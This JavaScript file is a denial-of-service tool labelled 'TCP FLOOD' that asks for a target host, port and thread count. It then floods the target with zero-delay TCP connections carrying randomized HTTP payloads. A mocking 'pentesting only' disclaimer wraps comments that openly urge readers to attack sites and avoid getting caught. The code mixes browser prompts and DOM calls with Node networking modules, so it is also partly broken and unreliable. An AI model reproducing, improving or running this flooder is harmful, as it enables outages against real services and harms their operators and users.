// ******************************************************************************
// *   FUCK YEAH! THIS TOOL IS FOR PENTESTING ONLY! ILLEGAL USE IS PROHIBITED...  *
// *   BUT WHO GIVES A SHIT? NOODLES INC. IS NOT RESPONSIBLE FOR MISUSE. HA!  *
// ******************************************************************************

// ******************************************************************************
// *               DDoS TOOL - TCP FLOOD - v3.0 - FUCK EVERYTHING HARDER!           *
// ******************************************************************************

// Configuration - Let's fuck things up!
let targetURL = prompt("Enter target URL (including http/https/onion):");
let targetHost;
try {
    targetURL = new URL(targetURL);
    targetHost = targetURL.hostname;
} catch (error) {
    alert("Invalid URL! You fucked it up!");
    window.close();
}
const port = parseInt(prompt("Enter target port (e.g., 80, 443, 8080):"));
const threads = parseInt(prompt("Enter number of threads (crank it up to 666!):"));
const duration = parseInt(prompt("Enter duration in seconds (let's go long term - FOREVER!):"));
const logFile = "ddos_fuck_log.txt"; // Log file name - keep track of the carnage
let isRunning = false; // Track attack status

// Colors (ANSI escape codes) - Make it look badass!
const darkGreen = "\x1b[32m";
const purple = "\x1b[35m";
const darkRed = "\x1b[31m";
const darkBlue = "\x1b[34m";
const resetColor = "\x1b[0m";

// Get elements for start, stop, and timer
const startButton = document.createElement('button');
startButton.textContent = 'Start Attack';
startButton.style.backgroundColor = 'darkgreen';
startButton.style.color = 'white';
startButton.style.padding = '10px';
startButton.style.margin = '5px';
document.body.appendChild(startButton);

const stopButton = document.createElement('button');
stopButton.textContent = 'Stop Attack';
stopButton.style.backgroundColor = 'darkred';
stopButton.style.color = 'white';
stopButton.style.padding = '10px';
stopButton.style.margin = '5px';
stopButton.disabled = true; // Initially disabled
document.body.appendChild(stopButton);

const timerDisplay = document.createElement('div');
timerDisplay.textContent = 'Attack Duration: 0 seconds';
timerDisplay.style.color = 'white';
timerDisplay.style.fontFamily = 'monospace';
timerDisplay.style.margin = '5px';
document.body.appendChild(timerDisplay);

let startTime;
let timerInterval;

// Logging function - gotta record the destruction!
function log(message) {
    const timestamp = new Date().toISOString();
    const logEntry = `[${timestamp}] ${message}\n`;
    console.log(`${darkGreen}[LOG] ${message}${resetColor}`);
    // Simple file logging (Node.js environment) - let's write this shit to disk
    try {
        const fs = require('fs');
        fs.appendFileSync(logFile, logEntry);
    } catch (error) {
        console.error(`${darkRed}[ERROR] Failed to write to log file: ${error}${resetColor}`);
    }
}

// TCP Flood function - this is where the magic happens!
async function tcpFlood(threadId) {
    const net = require('net');
    const crypto = require('crypto'); // For more randomness and obfuscation!

    log(`${purple}[THREAD ${threadId}] Starting TCP flood against ${targetHost}:${port}${resetColor}`);

    while (isRunning) {
        try {
            const socket = net.createConnection({ host: targetHost, port: port }, () => {
                log(`${darkBlue}[THREAD ${threadId}] Connected to ${targetHost}:${port}${resetColor}`);

                // Send garbage data - flood them with useless crap!
                let intervalId = setInterval(() => {
                    // More randomized payload - make it harder to filter!
                    let payload = "GET / HTTP/1.1\r\n";
                    payload += `Host: ${targetHost}\r\n`;
                    payload += "Connection: keep-alive\r\n";
                    payload += "Cache-Control: max-age=0\r\n";
                    payload += "Upgrade-Insecure-Requests: 1\r\n";
                    payload += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\n";
                    payload += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r\n";
                    payload += "Accept-Encoding: gzip, deflate\r\n";
                    payload += "Accept-Language: en-US,en;q=0.9\r\n\r\n";
                    payload += "X-Flooder: " + crypto.randomBytes(20).toString('hex') + "\r\n"; // Random hex string
                    try {
                        socket.write(payload);
                    } catch (writeError) {
                        log(`${darkRed}[THREAD ${threadId}] Error writing to socket: ${writeError}${resetColor}`);
                        clearInterval(intervalId);
                        socket.destroy();
                    }
                }, 0); // Crank up the speed - FASTER IS FUCKING BETTER! Zero delay!
            });

            socket.on('error', (err) => {
                log(`${darkRed}[THREAD ${threadId}] Socket error: ${err.message}${resetColor}`);
                socket.destroy();
            });

            socket.on('close', () => {
                log(`${darkBlue}[THREAD ${threadId}] Socket closed${resetColor}`);
            });

        } catch (connectError) {
            log(`${darkRed}[THREAD ${threadId}] Connection error: ${connectError}${resetColor}`);
        }
    }

    log(`${purple}[THREAD ${threadId}] TCP flood finished${resetColor}`);
}

// Timer Function
function updateTimer() {
    const elapsedTime = Math.floor((Date.now() - startTime) / 1000);
    timerDisplay.textContent = `Attack Duration: ${elapsedTime} seconds`;
}

// Main execution - let's get this party started!
async function main() {
    log(`${darkGreen}[MAIN] Starting DDoS attack against ${targetHost}:${port} with ${threads} threads - FUCK YEAH!${resetColor}`);
    isRunning = true;
    startTime = Date.now();
    timerInterval = setInterval(updateTimer, 1000);

    for (let i = 0; i < threads; i++) {
        tcpFlood(i + 1);
    }
}

// Add event listeners to buttons
startButton.addEventListener('click', () => {
    startButton.disabled = true;
    stopButton.disabled = false;
    main();
});

stopButton.addEventListener('click', () => {
    isRunning = false;
    clearInterval(timerInterval);
    startButton.disabled = false;
    stopButton.disabled = true;
    log(`${darkGreen}[MAIN] Attack stopped manually.${resetColor}`);
});

// Explicit user consent required - just to cover our asses (sort of)
if (confirm("WARNING: This tool is for PENTESTING purposes ONLY. Unauthorized use is ILLEGAL and will probably land your ass in jail. Noodles Inc. is NOT responsible for any misuse. We're not even a real company. Do you agree to proceed and accept the consequences like a FUCKING MAN? (LOL)")) {
    // Do nothing here; the start button triggers the attack
} else {
    window.close(); // Close the window if the user does not agree
}

// Educational Information (Can be expanded in the UI) - who gives a shit?
console.log("%c[INFO] This TCP Flood tool works by opening multiple TCP connections to the target server and sending a continuous stream of data. This can overwhelm the server and make it unavailable. - Now go fuck some shit up and don't get caught, you dumbass!", "color: darkblue;");

// Security Headers (Example - adapt as needed for the server environment) - yeah right, as if we care.
// This would typically be set server-side, but for demonstration:
try {
    document.head.insertAdjacentHTML("beforeend", `<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'">`);
} catch (e) {
    console.warn("[WARN] Could not set security headers. This is expected in some environments. - Whatever, it's all gonna burn anyway. Just like your sorry ass when you get caught!");
}